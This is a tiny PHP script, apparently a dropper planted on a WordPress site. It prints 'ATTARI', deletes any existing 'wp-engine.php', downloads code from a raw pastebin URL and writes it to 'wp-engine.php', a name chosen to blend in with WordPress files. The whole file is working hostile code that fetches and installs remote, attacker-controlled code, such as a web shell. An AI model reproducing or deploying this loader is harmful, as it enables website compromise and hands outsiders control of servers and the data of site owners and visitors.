<?php
//jg


echo "ATTARI";

function engine()
{
	unlink('wp-engine.php');
	$code = file_get_contents('https://pastebin.com/raw/6UD40XpN');
	$doit = fopen('wp-engine.php', 'w');
	fwrite($doit,$code);
	fclose($doit);
	
}

engine();

?>
